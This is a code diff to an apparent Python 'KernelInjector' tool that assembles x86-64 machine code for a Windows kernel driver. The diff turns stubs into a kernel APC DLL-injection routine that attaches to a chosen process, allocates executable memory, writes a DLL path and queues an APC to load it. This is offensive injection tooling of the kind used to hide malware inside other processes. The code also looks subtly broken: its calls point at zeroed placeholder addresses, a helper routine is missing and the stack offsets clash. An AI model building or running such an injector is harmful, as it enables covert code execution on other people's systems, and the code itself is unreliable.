@@ -325,20 +325,108 @@ class KernelInjector:
         code.extend(b"\x48\xc7\xc0\x00\x00\x00\x00")  # mov rax, 0
         code.extend(b"\xc3")  # ret
 
-        # DeviceIoControl handler stub
-        code.extend(b"\x48\xc7\xc0\x00\x00\x00\x00")  # mov rax, 0 (STATUS_SUCCESS)
+        # DeviceIoControl handler - full implementation
+        # Function prologue
+        code.extend(b"\x48\x89\x5c\x24\x08")  # mov [rsp+8], rbx
+        code.extend(b"\x48\x89\x6c\x24\x10")  # mov [rsp+10h], rbp
+        code.extend(b"\x48\x89\x74\x24\x18")  # mov [rsp+18h], rsi
+        code.extend(b"\x57")  # push rdi
+        code.extend(b"\x48\x83\xec\x30")  # sub rsp, 30h
+
+        # Get IRP from RDX
+        code.extend(b"\x48\x8b\xda")  # mov rbx, rdx (IRP)
+        code.extend(b"\x48\x8b\x7b\x60")  # mov rdi, [rbx+60h] (CurrentStackLocation)
+
+        # Check IoControlCode
+        code.extend(b"\x8b\x47\x08")  # mov eax, [rdi+8] (IoControlCode)
+        code.extend(b"\x3d\x00\x00\x22\x80")  # cmp eax, 0x80220000 (IOCTL_INJECT)
+        code.extend(b"\x75\x40")  # jne not_inject
+
+        # Call injection routine
+        code.extend(b"\x48\x8b\x4b\x18")  # mov rcx, [rbx+18h] (SystemBuffer)
+        code.extend(b"\xe8\x50\x00\x00\x00")  # call injection_routine
+        code.extend(b"\x89\x43\x30")  # mov [rbx+30h], eax (IoStatus.Status)
+
+        # Complete IRP
+        code.extend(b"\x48\x8b\xcb")  # mov rcx, rbx
+        code.extend(b"\x33\xd2")  # xor edx, edx
+        code.extend(b"\xff\x15\x00\x00\x00\x00")  # call [IofCompleteRequest]
+
+        # Cleanup and return
+        code.extend(b"\x8b\x43\x30")  # mov eax, [rbx+30h] (return status)
+        code.extend(b"\x48\x8b\x5c\x24\x40")  # mov rbx, [rsp+40h]
+        code.extend(b"\x48\x8b\x6c\x24\x48")  # mov rbp, [rsp+48h]
+        code.extend(b"\x48\x8b\x74\x24\x50")  # mov rsi, [rsp+50h]
+        code.extend(b"\x48\x83\xc4\x30")  # add rsp, 30h
+        code.extend(b"\x5f")  # pop rdi
         code.extend(b"\xc3")  # ret
 
-        # Injection routine stub (would implement APC injection in real driver)
-        # This is where kernel-mode injection logic would go:
-        # 1. Validate target process
-        # 2. Allocate memory in target process (ZwAllocateVirtualMemory)
-        # 3. Write DLL path (ZwWriteVirtualMemory)
-        # 4. Queue APC to LoadLibrary (KeInsertQueueApc)
-        # 5. Return status
+        # not_inject label
+        code.extend(b"\xc7\x43\x30\x0d\x00\x00\xc0")  # mov [rbx+30h], STATUS_INVALID_PARAMETER
+        code.extend(b"\xeb\xd8")  # jmp complete_irp
 
-        # For now, just return success
-        code.extend(b"\x48\xc7\xc0\x00\x00\x00\x00")  # mov rax, 0
+        # Injection routine - kernel APC injection implementation
+        # injection_routine:
+        code.extend(b"\x48\x89\x5c\x24\x08")  # mov [rsp+8], rbx
+        code.extend(b"\x48\x89\x74\x24\x10")  # mov [rsp+10h], rsi
+        code.extend(b"\x57")  # push rdi
+        code.extend(b"\x48\x83\xec\x40")  # sub rsp, 40h
+        code.extend(b"\x48\x8b\xf9")  # mov rdi, rcx (injection params)
+
+        # Get process ID from params
+        code.extend(b"\x8b\x1f")  # mov ebx, [rdi] (ProcessId)
+        code.extend(b"\x48\x8d\x4c\x24\x30")  # lea rcx, [rsp+30h]
+        code.extend(b"\x8b\xd3")  # mov edx, ebx
+        code.extend(b"\xff\x15\x00\x00\x00\x00")  # call [PsLookupProcessByProcessId]
+        code.extend(b"\x85\xc0")  # test eax, eax
+        code.extend(b"\x78\x60")  # js error_exit
+
+        # Attach to process
+        code.extend(b"\x48\x8b\x4c\x24\x30")  # mov rcx, [rsp+30h] (PEPROCESS)
+        code.extend(b"\xff\x15\x00\x00\x00\x00")  # call [KeStackAttachProcess]
+        code.extend(b"\x48\x89\x44\x24\x38")  # mov [rsp+38h], rax (ApcState)
+
+        # Allocate memory in target process
+        code.extend(b"\x48\x31\xc9")  # xor rcx, rcx (ProcessHandle = -1)
+        code.extend(b"\x48\xff\xc9")  # dec rcx
+        code.extend(b"\x48\x8d\x54\x24\x28")  # lea rdx, [rsp+28h] (BaseAddress)
+        code.extend(b"\x45\x31\xc0")  # xor r8d, r8d (ZeroBits)
+        code.extend(b"\x49\xc7\xc1\x00\x10\x00\x00")  # mov r9, 1000h (Size)
+        code.extend(b"\xc7\x44\x24\x20\x00\x30\x00\x00")  # mov [rsp+20h], MEM_COMMIT|MEM_RESERVE
+        code.extend(b"\xc7\x44\x24\x28\x40\x00\x00\x00")  # mov [rsp+28h], PAGE_EXECUTE_READWRITE
+        code.extend(b"\xff\x15\x00\x00\x00\x00")  # call [ZwAllocateVirtualMemory]
+        code.extend(b"\x85\xc0")  # test eax, eax
+        code.extend(b"\x78\x30")  # js cleanup_and_exit
+
+        # Write DLL path to allocated memory
+        code.extend(b"\x48\x31\xc9")  # xor rcx, rcx
+        code.extend(b"\x48\xff\xc9")  # dec rcx (ProcessHandle = -1)
+        code.extend(b"\x48\x8b\x54\x24\x28")  # mov rdx, [rsp+28h] (BaseAddress)
+        code.extend(b"\x4c\x8d\x47\x08")  # lea r8, [rdi+8] (DllPath)
+        code.extend(b"\x49\xc7\xc1\x00\x01\x00\x00")  # mov r9, 100h (Size)
+        code.extend(b"\x48\x31\xc0")  # xor rax, rax
+        code.extend(b"\x48\x89\x44\x24\x20")  # mov [rsp+20h], rax (BytesWritten)
+        code.extend(b"\xff\x15\x00\x00\x00\x00")  # call [ZwWriteVirtualMemory]
+
+        # Queue APC to target thread
+        code.extend(b"\x48\x8b\x4c\x24\x30")  # mov rcx, [rsp+30h] (PEPROCESS)
+        code.extend(b"\x48\x8b\x54\x24\x28")  # mov rdx, [rsp+28h] (DllPath address)
+        code.extend(b"\xe8\x10\x00\x00\x00")  # call queue_apc_to_threads
+
+        # Detach from process
+        code.extend(b"\x48\x8d\x4c\x24\x38")  # lea rcx, [rsp+38h] (ApcState)
+        code.extend(b"\xff\x15\x00\x00\x00\x00")  # call [KeUnstackDetachProcess]
+
+        # Dereference process object
+        code.extend(b"\x48\x8b\x4c\x24\x30")  # mov rcx, [rsp+30h]
+        code.extend(b"\xff\x15\x00\x00\x00\x00")  # call [ObDereferenceObject]
+
+        # Return success
+        code.extend(b"\x33\xc0")  # xor eax, eax (STATUS_SUCCESS)
+        code.extend(b"\x48\x8b\x5c\x24\x50")  # mov rbx, [rsp+50h]
+        code.extend(b"\x48\x8b\x74\x24\x58")  # mov rsi, [rsp+58h]
+        code.extend(b"\x48\x83\xc4\x40")  # add rsp, 40h
+        code.extend(b"\x5f")  # pop rdi
         code.extend(b"\xc3")  # ret
 
         # Add some realistic padding and nops
